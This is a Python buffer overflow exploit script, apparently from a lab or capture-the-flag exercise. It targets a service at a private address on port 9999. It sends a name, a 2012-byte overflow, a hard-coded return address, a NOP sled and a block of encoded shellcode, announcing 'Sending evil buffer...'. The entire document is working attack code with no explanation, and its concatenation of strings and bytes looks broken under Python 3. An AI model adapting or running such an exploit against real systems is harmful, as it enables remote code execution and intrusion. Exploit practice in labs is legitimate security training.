import socket

ip = "10.10.178.84"
port = 9999

name = "tom"
prefix = ""
offset = 2012
overflow = "A" * offset
retn = b"\xdf\x14\x50\x62"
buf =  b""
buf += b"\xb8\xae\x9d\x1e\x95\xda\xd1\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\xed\x93\xfc"
buf += b"\x60\x0d\x43\x82\x8b\xed\x94\xe3\x02\x08\xa5\x23\x70"
buf += b"\x59\x96\x93\xf2\x0f\x1b\x5f\x56\xbb\xa8\x2d\x7f\xcc"
buf += b"\x19\x9b\x59\xe3\x9a\xb0\x9a\x62\x19\xcb\xce\x44\x20"
buf += b"\x04\x03\x85\x65\x79\xee\xd7\x3e\xf5\x5d\xc7\x4b\x43"
buf += b"\x5e\x6c\x07\x45\xe6\x91\xd0\x64\xc7\x04\x6a\x3f\xc7"
buf += b"\xa7\xbf\x4b\x4e\xbf\xdc\x76\x18\x34\x16\x0c\x9b\x9c"
buf += b"\x66\xed\x30\xe1\x46\x1c\x48\x26\x60\xff\x3f\x5e\x92"
buf += b"\x82\x47\xa5\xe8\x58\xcd\x3d\x4a\x2a\x75\x99\x6a\xff"
buf += b"\xe0\x6a\x60\xb4\x67\x34\x65\x4b\xab\x4f\x91\xc0\x4a"
buf += b"\x9f\x13\x92\x68\x3b\x7f\x40\x10\x1a\x25\x27\x2d\x7c"
buf += b"\x86\x98\x8b\xf7\x2b\xcc\xa1\x5a\x24\x21\x88\x64\xb4"
buf += b"\x2d\x9b\x17\x86\xf2\x37\xbf\xaa\x7b\x9e\x38\xcc\x51"
buf += b"\x66\xd6\x33\x5a\x97\xff\xf7\x0e\xc7\x97\xde\x2e\x8c"
buf += b"\x67\xde\xfa\x03\x37\x70\x55\xe4\xe7\x30\x05\x8c\xed"
buf += b"\xbe\x7a\xac\x0e\x15\x13\x47\xf5\xfe\x16\x92\x30\x6e"
buf += b"\x4e\xa0\xba\x9e\xd3\x2d\x5c\xca\xfb\x7b\xf7\x63\x65"
buf += b"\x26\x83\x12\x6a\xfc\xee\x15\xe0\xf3\x0f\xdb\x01\x79"
buf += b"\x03\x8c\xe1\x34\x79\x1b\xfd\xe2\x15\xc7\x6c\x69\xe5"
buf += b"\x8e\x8c\x26\xb2\xc7\x63\x3f\x56\xfa\xda\xe9\x44\x07"
buf += b"\xba\xd2\xcc\xdc\x7f\xdc\xcd\x91\xc4\xfa\xdd\x6f\xc4"
buf += b"\x46\x89\x3f\x93\x10\x67\x86\x4d\xd3\xd1\x50\x21\xbd"
buf += b"\xb5\x25\x09\x7e\xc3\x29\x44\x08\x2b\x9b\x31\x4d\x54"
buf += b"\x14\xd6\x59\x2d\x48\x46\xa5\xe4\xc8\x66\x44\x2c\x25"
buf += b"\x0f\xd1\xa5\x84\x52\xe2\x10\xca\x6a\x61\x90\xb3\x88"
buf += b"\x79\xd1\xb6\xd5\x3d\x0a\xcb\x46\xa8\x2c\x78\x66\xf9"
payload = buf
padding = b"\x90" * 32
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(name + "\r\n")
  s.recv(1024)
  print("Sending evil buffer...")
  s.send(buffer + "\r\n")
  print("Done!")
except:
  print("Could not connect.")
